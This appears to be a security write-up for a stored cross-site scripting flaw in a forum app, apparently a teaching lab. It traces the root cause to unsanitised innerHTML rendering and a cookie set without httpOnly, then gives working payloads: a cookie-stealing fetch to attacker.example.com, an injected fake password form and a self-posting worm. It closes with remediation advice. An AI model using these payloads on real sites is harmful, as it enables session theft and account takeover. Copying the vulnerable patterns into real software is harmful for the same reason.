# Stored Cross Site Scripting Vulnerability Documentation:

## 1. Vulnerability Overview:
1. Problem Definition: Stored Cross Site Scripting occurs when an application receives untrusted data, saves it into a persistent storage system such as SQLite, and subsequently renders that data in the browser without contextual sanitization.
2. Persistent Execution: Because the malicious payload is saved permanently in the database, every user who visits that discussion thread automatically triggers the execution.
3. Severe Impact: Attackers can execute arbitrary JavaScript commands within the victim browser session to steal cookies, perform unauthorized actions, or display fraudulent login forms.

## 2. Root Cause Code Analysis:

### 2.1 Backend Data Ingestion (server/routes/posts.js):
1. The server receives user input from the request body without sanitizing HTML tags or stripping executable scripts.
2. The raw string is inserted directly into the SQLite database table comments.
3. Code Reference: db.prepare("INSERT INTO comments (post_id, user_id, content) VALUES (?, ?, ?)").run(req.params.id, req.user.id, content).
4. SQL parameterization prevents SQL injection, but does not prevent Cross Site Scripting because the database legitimately stores the raw string.

### 2.2 Frontend DOM Rendering (client/src/components/ContentRenderer.jsx):
1. The React frontend retrieves the stored comment string from the server.
2. The component inserts the string into the DOM using innerHTML to enable rich text styling.
3. Script tags and inline HTML event handlers such as onerror and onload are parsed and executed by the browser engine.
4. Code Reference: containerRef.current.innerHTML = content.

### 2.3 Session Cookie Configuration (server/routes/auth.js):
1. The authentication module sets the session cookie without the httpOnly flag.
2. Code Reference: res.cookie("session_token", token, { path: "/" }).
3. Because httpOnly is absent, client scripts can read authentication tokens through document.cookie.

## 3. Attack Demonstration Procedure:

### Step 1: Attacker Account Access:
1. The attacker logs into the forum using the account credentials for lucky or registers a new account.
2. The attacker navigates to the first discussion thread titled Welcome to the IIITA Open Source Community Forum.

### Step 2: Injecting the Malicious Payload:
1. In the Leave a Comment text area, the attacker inputs an HTML and JavaScript payload.
2. The attacker clicks the Submit Comment button.
3. The application sends a POST request to /api/posts/1/comments and stores the payload in the SQLite database.

### Step 3: Victim Navigation and Payload Trigger:
1. An administrator such as Mridankan Mandal logs in on another browser or window.
2. The administrator navigates to the Discussions tab and opens the first post.
3. The browser fetches the discussion comments and renders the attacker input directly into the DOM.
4. The image element fails to load the source, triggering the onerror event handler automatically.
5. The JavaScript executes immediately within the administrator session context, popping up an alert box displaying the administrator session token.

## 4. Practical Exploit Examples and Explanations:

### Example 1: Proof of Concept Alert Dialog:
1. Payload: <img src="x" onerror="alert('Stored XSS Executed on IIITA Forum! User: ' + document.cookie)">.
2. Explanation: This payload verifies that arbitrary JavaScript execution is possible upon rendering. The img element deliberately uses an invalid image path x to force the browser to trigger the onerror event handler without requiring user clicks.

### Example 2: Session Cookie Exfiltration and Account Takeover:
1. Payload: <img src="x" onerror="fetch('https://attacker.example.com/log?cookie=' + encodeURIComponent(document.cookie))">.
2. Explanation: This payload silently reads the victim session cookie via document.cookie and transmits it through an HTTP GET request to an external server. Once the attacker obtains the token, they can impersonate the administrator without knowing the password.

### Example 3: Injected Phishing Form and Credential Harvesting:
1. Payload: <div style="border: 2px solid #dc2626; padding: 15px; background: #ffffff; border_radius: 6px; margin: 10px 0;"><h4 style="color: #dc2626;">Session Expired</h4><p>Please reenter your campus password:</p><input type="password" id="phish_pass" placeholder="Password"><button onclick="alert('Stolen: ' + document.getElementById('phish_pass').value)">Confirm</button></div>.
2. Explanation: This payload injects a fake authentication prompt directly into the legitimate forum discussion. Because the form appears within the trusted domain, users may enter sensitive credentials which are subsequently captured by the attacker.

### Example 4: Stored XSS Worm and Automated Action Execution:
1. Payload: <script>fetch('/api/posts/1/comments', { method: 'POST', headers: { 'Content_Type': 'application/json' }, body: JSON.stringify({ content: 'This thread has been compromised by an automated script.' }) });</script>.
2. Explanation: This payload uses the viewing victim active authenticated session to make a background POST request to the API, automatically submitting unauthorized comments on behalf of the victim.

## 5. Summary of Key Remediation Concepts for Version 2:
1. Context Aware Output Neutralization: Use libraries such as DOMPurify or default React safe text interpolation to strip executable scripts and hazardous attributes before inserting content into the DOM.
2. HttpOnly Cookie Flags: Ensure all authentication cookies are configured with httpOnly true and sameSite strict so that client scripts cannot access session tokens.
3. Content Security Policy: Enforce strict HTTP Content Security Policy response headers to restrict the browser from executing unauthorized inline scripts.
